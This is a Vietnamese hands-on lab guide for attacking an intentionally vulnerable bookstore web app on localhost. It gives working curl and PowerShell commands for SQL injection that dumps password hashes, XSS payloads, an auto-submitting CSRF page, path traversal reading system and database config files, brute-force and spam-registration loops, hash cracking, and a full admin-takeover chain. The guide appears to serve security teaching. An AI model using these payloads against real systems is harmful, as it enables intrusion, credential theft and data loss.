# Hướng Dẫn Thực Hành Lab Bảo Mật Web - Chi Tiết Từng Bước

## Chuẩn Bị Trước Khi Bắt Đầu

### 1. Khởi động ứng dụng
```bash
# Mở PowerShell tại thư mục gốc của project
cd D:\Tai\ lieu\ki6\ATUDWEB\JVA-bookstore-sec

# Chạy script để khởi động ứng dụng với HTTPS
.\run-localhost-https.bat
```

**Kết quả mong đợi**: 
- Ứng dụng chạy trên `https://localhost:8443`
- Thấy dòng "BUILD SUCCESS" trong terminal
- Tomcat server khởi động thành công

### 2. Cài đặt công cụ cần thiết
- **curl**: Để gửi HTTP request (đã có sẵn trên Windows)
- **Trình duyệt web**: Để kiểm tra kết quả trực quan
- **PowerShell hoặc Git Bash**: Để chạy các lệnh

---

## LAB 1: SQL Injection (Tiêm Mã SQL)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: Ứng dụng ghép trực tiếp input người dùng vào câu lệnh SQL mà không kiểm tra
- **Nguy hiểm**: Attacker có thể đọc/sửa/xóa dữ liệu trong database
- **Cách phát hiện**: Khi input chứa ký tự `'` hoặc `--` mà không bị lỗi

### Bước 2: Test SQL Injection cơ bản
Mở PowerShell và gõ lệnh:
```bash
curl -k "https://localhost:8443/api/books/search-quick?q=' OR '1'='1"
```

**Giải thích**:
- `-k`: Bỏ qua cảnh báo SSL certificate
- `?q=`: Parameter tìm kiếm
- `' OR '1'='1`: SQL payload - luôn trả về true, sẽ trả về tất cả sách

**Kết quả mong đợi**: JSON với danh sách tất cả sách (thay vì chỉ sách matching)

### Bước 3: Trích xuất version database
```bash
curl -k "https://localhost:8443/api/books/search-quick?q='; SELECT version() --"
```

**Giải thích**:
- `'; SELECT version() --`: Chèn câu lệnh SELECT để lấy version
- `--`: Comment để bỏ qua phần còn lại của câu SQL

**Kết quả mong đợi**: Thấy version PostgreSQL trong response

### Bước 4: Trích xuất thông tin user
```bash
curl -k "https://localhost:8443/api/books/search-quick?q=' UNION SELECT id, email, password_hash, username FROM users --"
```

**Giải thích**:
- `UNION SELECT`: Ghép kết quả từ tableUsers với Books
- Trả về: ID, email, hash password, username của tất cả user

**Kết quả mong đợi**: JSON chứa dữ liệu user bao gồm password hash

### Bước 5: Lưu kết quả ra file (tùy chọn)
```bash
curl -k "https://localhost:8443/api/books/search-quick?q=' UNION SELECT id, email, password_hash, role FROM users --" > sqli_results.json
```

**Giải thích**: Lưu JSON response vào file `sqli_results.json` để phân tích sau

---

## LAB 2: Reflected XSS (XSS Phản Chiếu)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: Ứng dụng hiển thị input người dùng trực tiếp trong HTML mà không escape
- **Nguy hiểm**: Attacker có thể chèn JavaScript, đánh cắp cookie, chuyển hướng user
- **Cách phát hiện**: Khi thấy input của mình xuất hiện trong HTML source

### Bước 2: Test XSS cơ bản - Alert box
Cách 1: Dùng curl
```bash
curl -k "https://localhost:8443/api/books/search-result?q=<script>alert('XSS')</script>"
```

Cách 2: Dùng trình duyệt - truy cập trực tiếp URL:
```
https://localhost:8443/api/books/search-result?q=<script>alert('XSS')</script>
```

**Giải thích**:
- Endpoint `/api/books/search-result` trả về HTML response
- Input `q` được nhúng vào HTML mà không escape
- Trình duyệt chạy script JavaScript `alert('XSS')`

**Kết quả mong đợi**: 
- Khi mở URL trong trình duyệt: Thấy alert box với text "XSS"
- Curl: Thấy `<script>alert(...)` trong HTML response

### Bước 3: Thử XSS với IMG tag
```bash
curl -k "https://localhost:8443/api/books/search-result?q=<img src=x onerror=alert('XSS_IMG')>"
```

**Giải thích**:
- Cách khác để chạy JavaScript qua img tag fallback
- `onerror`: Event được trigger khi img fail load
- Hiệu quả hơn vì không cần `<script>` tag

**Kết quả mong đợi**: Alert box với text "XSS_IMG"

### Bước 4: Đánh cắp thông tin (Proof of Concept)
```javascript
// Lấy document.domain, cookies
alert('Domain: ' + document.domain + '\nCookies: ' + document.cookie)
```

Dùng trực tiếp trong URL:
```
https://localhost:8443/api/books/search-result?q=<script>alert('Domain: ' + document.domain)</script>
```

**Kết quả mong đợi**: Thấy domain của ứng dụng trong alert

---

## LAB 3: Stored XSS (XSS Lưu Trữ)

### Bước 1: Hiểu về lỗ hổng
- **Khác Reflected XSS**: Dữ liệu XSS được lưu trữ trong database
- **Nguy hiểm hơn**: Mỗi user khác truy cập sẽ bị execute script
- **Cách phát hiện**: Dữ liệu từ form được lưu vào database mà không được sanitize

### Bước 2: Chèn comment chứa XSS
```bash
curl -k -X POST "https://localhost:8443/api/comments" \
  -H "Content-Type: application/json" \
  -d '{
    "bookId": 1,
    "userId": 1,
    "comment": "<script>alert(\"Stored XSS\")</script>",
    "rating": 5
  }'
```

**Giải thích**:
- `-X POST`: Gửi HTTP POST request
- `-H "Content-Type: application/json"`: Header cho JSON data
- `bookId`, `userId`: ID của sách và người dùng
- `comment`: Chứa script malicious

**Kết quả mong đợi**: JSON response: `{"message": "Comment added successfully"}`

### Bước 3: Xem comment và trigger XSS
Cách 1: Dùng trình duyệt
```
https://localhost:8443/book-detail.jsp?id=1
```

Cách 2: Lấy HTML của trang
```bash
curl -k "https://localhost:8443/book-detail.jsp?id=1" > book_detail.html
```

**Kết quả mong đợi**: 
- Khi mở page trong trình duyệt: Alert box xuất hiện ngay
- HTML chứa tag `<script>alert(...)</script>` không bị escape

### Bước 4: Thử payload khác
```bash
curl -k -X POST "https://localhost:8443/api/comments" \
  -H "Content-Type: application/json" \
  -d '{
    "bookId": 2,
    "userId": 1,
    "comment": "<img src=x onerror=\"alert(\"Stored via IMG\")>",
    "rating": 4
  }'
```

---

## LAB 4: IDOR (Insecure Direct Object Reference)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: API không kiểm tra quyền trước khi trả về dữ liệu
- **Nguy hiểm**: Bất kỳ user nào cũng có thể đọc dữ liệu của user khác
- **Cách phát hiện**: Parameter ID không được check authorization

### Bước 2: Truy cập profile của user 1
```bash
curl -k "https://localhost:8443/api/profile/user-info?userId=1"
```

**Giải thích**:
- Lấy thông tin user có ID = 1
- Không cần login hay token
- API không check xem user hiện tại có quyền không

**Kết quả mong đợi**: JSON chứa:
```json
{
  "id": 1,
  "email": "email@example.com",
  "full_name": "User Name",
  "phone": "0123456789",
  "address": "Address Here"
}
```

### Bước 3: Enumerating - Tìm tất cả user
```bash
# Windows PowerShell
for ($i = 1; $i -le 10; $i++) {
  Write-Host "=== User $i ==="
  curl -k "https://localhost:8443/api/profile/user-info?userId=$i"
}
```

Hoặc dùng bash (Git Bash):
```bash
for i in {1..10}; do
  echo "=== User $i ==="
  curl -k "https://localhost:8443/api/profile/user-info?userId=$i"
done
```

**Giải thích**:
- Loop qua các ID từ 1 đến 10
- Mỗi request sẽ trả về thông tin user

**Kết quả mong đợi**: Thấy email, phone, address của tất cả user

### Bước 4: Tìm user admin
```bash
# Tìm người có role = admin hoặc email chứa "admin"
for ($i = 1; $i -le 50; $i++) {
  $response = curl -k "https://localhost:8443/api/profile/user-info?userId=$i" -s | ConvertFrom-Json -ErrorAction SilentlyContinue
  if ($response.email -match "admin" -or $response.full_name -match "admin") {
    Write-Host "FOUND ADMIN USER: $($response | ConvertTo-Json)"
  }
}
```

---

## LAB 5: CSRF (Cross-Site Request Forgery)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: API POST không yêu cầu CSRF token
- **Nguy hiểm**: Attacker có thể tạo form trên trang khác, user sẽ vô tình thay đổi dữ liệu
- **Cách phát hiện**: POST endpoint không có token verification

### Bước 2: Tạo HTML file tấn công CSRF
Tạo file `csrf_poc.html`:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Cập nhật Hồ Sơ Miễn Phí</title>
</head>
<body>
    <h1>Bạn đã chiến thắng giải thưởng!</h1>
    <p>Nhấp vào nút để nhận giải thưởng...</p>
    
    <form id="csrf" action="https://localhost:8443/api/profile" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="fullName" value="Attacker">
        <input type="submit" value="Nhận Giải Thưởng">
    </form>
    
    <script>
        // Tự động submit form khi page load
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

**Giải thích**:
- Form hidden gửi POST to `/api/profile`
- Thay đổi email thành `attacker@evil.com`
- JavaScript tự động submit khi page load

### Bước 3: Simulate CSRF attack
Trước tiên, login vào ứng dụng:
```bash
curl -k -X POST "https://localhost:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "password123"
  }'
```

Sau đó, với cookie từ login đó, submit CSRF form:
```bash
curl -k -X POST "https://localhost:8443/api/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=hacked@attacker.com&fullName=HackedUser"
```

**Kết quả mong đợi**: Profile của user bị thay đổi thành email attacker

---

## LAB 6: Hardcoded Secret (Bí Mật Được Hardcode)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: Secret key được lưu trực tiếp trong code, không dùng environment variable
- **Nguy hiểm**: Attacker có thể tìm secret trong source code, dùng nó để access admin API
- **Cách phát hiện**: Tìm hardcoded strings trong code

### Bước 2: Tìm secret trong code
```bash
# Tìm secret trong AdminOrderServlet hoặc OrderDAO
grep -r "dev-secret" "src/"
```

**Kết quả**: Thấy `"dev-secret-key-change-me"` trong JwtFilter.java

### Bước 3: Dùng secret để access admin endpoint
```bash
curl -k "https://localhost:8443/api/admin/orders?secret=dev-secret-key-change-me"
```

**Giải thích**:
- Endpoint `/api/admin/orders` yêu cầu secret parameter
- Dùng hardcoded secret từ code
- Bypass authentication

**Kết quả mong đợi**: JSON chứa danh sách tất cả orders của hệ thống

### Bước 4: Khai thác tiếp theo
```bash
# Lấy thông tin chi tiết order
curl -k "https://localhost:8443/api/admin/orders?secret=dev-secret-key-change-me&orderId=1"

# Xóa order
curl -k -X DELETE "https://localhost:8443/api/admin/orders?secret=dev-secret-key-change-me&orderId=1"
```

---

## LAB 7: Sensitive Data Exposure (Lộ Thông Tin Nhạy Cảm)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: API trả về thông tin sensitive như password hash mà không filter
- **Nguy hiểm**: Attacker có thể crack hash offline, hoặc dùng dữ liệu để tấn công khác
- **Cách phát hiện**: Response JSON chứa `password_hash`, `ssn`, `credit_card` v.v

### Bước 2: Export dữ liệu tất cả user
```bash
curl -k "https://localhost:8443/api/profile/export"
```

**Giải thích**:
- Endpoint `/api/profile/export` trả về tất cả user
- Không cần authentication
- Chứa passwordHash, email, phone của mỗi user

**Kết quả mong đợi**: JSON array chứa tất cả user với password hashes

### Bước 3: Lưu dữ liệu ra file
```bash
curl -k "https://localhost:8443/api/profile/export" | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Out-File users_export.json
```

hoặc

```bash
curl -k "https://localhost:8443/api/profile/export" > users_export.json
```

### Bước 4: Phân tích password hash
```bash
# Xem nội dung file
Get-Content users_export.json

# Tìm tất cả passwordHash
Select-String "passwordHash" users_export.json

# Lưu hashes vào file riêng
(Get-Content users_export.json | ConvertFrom-Json).users | ForEach-Object { $_.passwordHash } | Out-File hashes.txt
```

### Bước 5: Crack password (optional - nếu có John the Ripper hoặc Hashcat)
```bash
# Nếu có John installed
john --wordlist=rockyou.txt hashes.txt

# hoặc Hashcat
hashcat -m 3200 hashes.txt rockyou.txt
```

---

## LAB 8: Path Traversal (Duyệt Thư Mục)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: Ứng dụng tạo file path bằng cách ghép trực tiếp user input
- **Nguy hiểm**: Attacker dùng `../` để escape khỏi thư mục cho phép, đọc file nhạy cảm
- **Cách phát hiện**: Parameter filename có thể chứa `../` mà không bị reject

### Bước 2: Đọc Windows configuration file
```bash
curl -k "https://localhost:8443/api/books/download?name=..\\..\\..\\windows\\win.ini"
```

**Giải thích**:
- `..\\..\\..`: Escape lên 3 cấp thư mục từ /uploads/
- `windows\\win.ini`: File Windows config
- Endpoint tạo path: `C:\uploads\` + parameter

**Kết quả mong đợi**: Nội dung file `win.ini` xuất hiện

### Bước 3: Đọc hosts file
```bash
curl -k "https://localhost:8443/api/books/download?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" -o hosts.txt
```

### Bước 4: Đọc database configuration
```bash
curl -k "https://localhost:8443/api/books/download?name=..\\..\\target\\classes\\db.properties"
```

**Giải thích**:
- Truy cập đến compiled resources
- Lấy thông tin kết nối database (username, password, URL)

**Kết quả mong đợi**: Thấy:
```
db.username=postgres
db.password=mypassword
db.url=jdbc:postgresql://localhost:5432/bookstore
```

### Bước 5: Lấy dữ liệu từ path traversal
```bash
# Lưu output vào file
curl -k "https://localhost:8443/api/books/download?name=..\\..\\target\\classes\\db.properties" > db_config.txt

# Xem nội dung
Get-Content db_config.txt
```

---

## LAB 9: Weak Authentication (Xác Thực Yếu)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: Endpoint đăng ký không kiểm tra độ mạnh password, không verify email
- **Nguy hiểm**: Attacker dễ tạo account với mục đích xấu
- **Cách phát hiện**: Có thể đăng ký với password `a` hoặc `123`

### Bước 2: Đăng ký với password 1 ký tự
```bash
curl -k -X POST "https://localhost:8443/api/auth/register-quick" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker1",
    "email": "hacker1@example.com",
    "password": "a"
  }'
```

**Kết quả mong đợi**: 
```json
{"message": "Registration successful! You can now login."}
```

### Bước 3: Đăng ký không verify email
```bash
curl -k -X POST "https://localhost:8443/api/auth/register-quick" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "fakeemail",
    "email": "nonexistent@example.com",
    "password": "123"
  }'
```

**Giải thích**:
- Email không tồn tại
- Không có email verification
- Account được tạo ngay lập tức

**Kết quả mong đợi**: Account được tạo, có thể login ngay

### Bước 4: Đăng nhập với account mới tạo
```bash
curl -k -X POST "https://localhost:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker1",
    "password": "a"
  }'
```

**Kết quả mong đợi**: Nhận JWT token có thể dùng để authenticated requests

---

## LAB 10: Information Disclosure (Lộ Thông Tin)

### Bước 1: Tìm thông tin lộ ở các endpoint
```bash
# Từ IDOR endpoint
curl -k "https://localhost:8443/api/profile/user-info?userId=1" | grep -E "email|phone|address"

# Từ Search endpoint
curl -k "https://localhost:8443/api/books/search-quick?q='; SELECT version() --"

# Từ Error messages
curl -k "https://localhost:8443/api/profile/invalid-endpoint"
```

### Bước 2: Collect PII (Personally Identifiable Information)
```bash
# Tất cả emails
curl -k "https://localhost:8443/api/profile/export" | Select-String '"email"'

# Tất cả phone numbers
curl -k "https://localhost:8443/api/profile/export" | Select-String '"phone"'

# Tất cả addresses
curl -k "https://localhost:8443/api/profile/export" | Select-String '"address"'
```

### Bước 3: Tạo danh sách target
```bash
# Lưu tất cả email vào file
curl -k "https://localhost:8443/api/profile/export" | ConvertFrom-Json | Select-Object -ExpandProperty users | Select-Object -ExpandProperty email | Out-File emails.txt

# Xem danh sách
Get-Content emails.txt
```

---

## LAB 11: Broken Access Control (Kiểm Soát Truy Cập Bị Phá Vỡ)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: Endpoint không check role/permission của user
- **Nguy hiểm**: Normal user có thể access admin functions
- **Cách phát hiện**: Endpoint admin accessible mà không cần admin token

### Bước 2: Access admin export function
```bash
# Không cần login
curl -k "https://localhost:8443/api/profile/export"

# Được tất cả user data kể cả admin accounts
```

### Bước 3: Khai thác - Lấy admin password hash
```bash
curl -k "https://localhost:8443/api/profile/export" | ConvertFrom-Json | Select-Object -ExpandProperty users | Where-Object {$_.email -match "admin"}
```

**Kết quả mong đợi**: Thấy account admin với password hash

### Bước 4: Tìm admin account khác
```bash
# Lấy tất cả accounts với role = "admin"
curl -k "https://localhost:8443/api/profile/export" | ConvertFrom-Json | Select-Object -ExpandProperty users | Where-Object {$_.role -eq "admin"}
```

---

## LAB 12: Missing Rate Limiting (Thiếu Giới Hạn Tốc Độ)

### Bước 1: Hiểu về lỗ hổng
- **Nguyên nhân**: Ứng dụng không limit số request trong thời gian nhất định
- **Nguy hiểm**: Attacker có thể brute force password, spam registration, DDoS
- **Cách phát hiện**: Có thể gửi unlimited requests mà không bị block

### Bước 2: Brute force login
```bash
# Thử đoán password cho admin account
$passwords = @("password", "admin", "123456", "password123", "admin123")

foreach ($pass in $passwords) {
  Write-Host "Trying password: $pass"
  $response = curl -k -X POST "https://localhost:8443/api/login" `
    -H "Content-Type: application/json" `
    -d "{`"username`":`"admin`",`"password`":`"$pass`"}" -s
  
  if ($response -match "token") {
    Write-Host "SUCCESS! Password is: $pass"
    Write-Host $response
    break
  }
}
```

### Bước 3: Enumerate usernames bằng registration
```bash
# Kiểm tra username nào đã tồn tại
$users = @("admin", "user", "test", "guest", "demo")

foreach ($user in $users) {
  Write-Host "Testing username: $user"
  $response = curl -k -X POST "https://localhost:8443/api/auth/register-quick" `
    -H "Content-Type: application/json" `
    -d "{`"username`":`"$user`",`"email`":`"test@test.com`",`"password`":`"pass`"}" -s
  
  if ($response -match "already exists") {
    Write-Host "FOUND: $user exists!"
  }
}
```

### Bước 4: Spam registration (tạo hàng loạt account)
```bash
# Tạo 50 account
for ($i = 1; $i -le 50; $i++) {
  Write-Host "Creating account $i..."
  curl -k -X POST "https://localhost:8443/api/auth/register-quick" `
    -H "Content-Type: application/json" `
    -d "{`"username`":`"spamuser$i`",`"email`":`"spam$i@example.com`",`"password`":`"pass$i`"}" `
    -s | Out-Null
  
  # Không có rate limiting, request được accept ngay
}

Write-Host "Created 50 accounts! (In real app, would be blocked after few attempts)"
```

### Bước 5: Kiểm tra - Các account đã được tạo
```bash
# Kiểm tra có thể login vào account spam
curl -k -X POST "https://localhost:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"spamuser1","password":"pass1"}'
```

**Kết quả mong đợi**: Đều thành công, không bị rate limit

---

## CHIẾN LƯỢC TẤN CÔNG HOÀN CHỈNH

### Scenario: Đánh Cắp Tài Khoản Admin

**Bước 1**: Dùng IDOR để enumerate all users
```bash
for ($i = 1; $i -le 50; $i++) {
  curl -k "https://localhost:8443/api/profile/user-info?userId=$i" 2>/dev/null | Select-String "admin|email" 
}
```

**Bước 2**: Dùng Sensitive Data Exposure để export all users
```bash
curl -k "https://localhost:8443/api/profile/export" > admin_users.json
Get-Content admin_users.json | ConvertFrom-Json
```

**Bước 3**: Tìm admin account từ JSON
```bash
(Get-Content admin_users.json | ConvertFrom-Json).users | Where-Object {$_.role -eq "admin"}
```

**Bước 4**: Lấy password hash của admin
```bash
$adminUser = (Get-Content admin_users.json | ConvertFrom-Json).users | Where-Object {$_.role -eq "admin"} | Select-Object -First 1
Write-Host "Admin password hash: " $adminUser.passwordHash
```

**Bước 5**: Crack password (ngoài scope nhưng có thể dùng online crack như https://crackstation.net/)

**Bước 6**: Login với password cracked
```bash
curl -k -X POST "https://localhost:8443/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_username","password":"cracked_password"}'
```

**Bước 7**: Dùng token để access admin features
```bash
# Sử dụng JWT token từ step 6
curl -k "https://localhost:8443/api/admin/orders" \
  -H "Authorization: Bearer <JWT_TOKEN>"
```

---

## Troubleshooting

### Vấn đề: `curl: (60) SSL: certificate problem`
**Giải pháp**: Thêm flag `-k` hoặc `--insecure` vào curl command

### Vấn đề: `connection refused` hoặc `Cannot GET /api/...`
**Giải pháp**: 
- Kiểm tra ứng dụng đang chạy: `netstat -an | Select-String 8443`
- Khởi động lại bằng `.\run-localhost-https.bat`

### Vấn đề: JSON parse error
**Giải pháp**: 
- Đảm bảo curl output là valid JSON
- Thêm `| jq '.'` để format JSON
- Hoặc dùng `ConvertFrom-Json` trong PowerShell

### Vấn đề: Không thấy password hash trong export
**Giải pháp**:
- Kiểm tra response JSON có field `password_hash` không
- Thử dùng `| Select-String "password"` để tìm

---

## Kiểm Tra Hoàn Thành Lab

**Checklist**:
- ✅ SQL Injection - Trích xuất user data thành công
- ✅ Reflected XSS - Alert box xuất hiện trong browser
- ✅ Stored XSS - Comment có script được lưu và execute
- ✅ IDOR - Xem được profile của user khác
- ✅ CSRF - Có thể tạo form để modify data
- ✅ Hardcoded Secret - Access admin endpoint với secret
- ✅ Sensitive Data - Lấy được tất cả password hashes
- ✅ Path Traversal - Đọc được file bên ngoài upload folder
- ✅ Weak Auth - Đăng ký với password yếu
- ✅ Broken Access Control - Access export endpoint không cần permission
- ✅ Information Disclosure - Collect được PII của tất cả users
- ✅ Missing Rate Limiting - Spam registration nhiều lần liên tục

---

**LƯU Ý QUAN TRỌNG**: Các lab này chỉ dùng cho mục đích học tập và thực hành kỹ năng bảo mật. Không được sử dụng để tấn công các hệ thống mà bạn không có quyền!
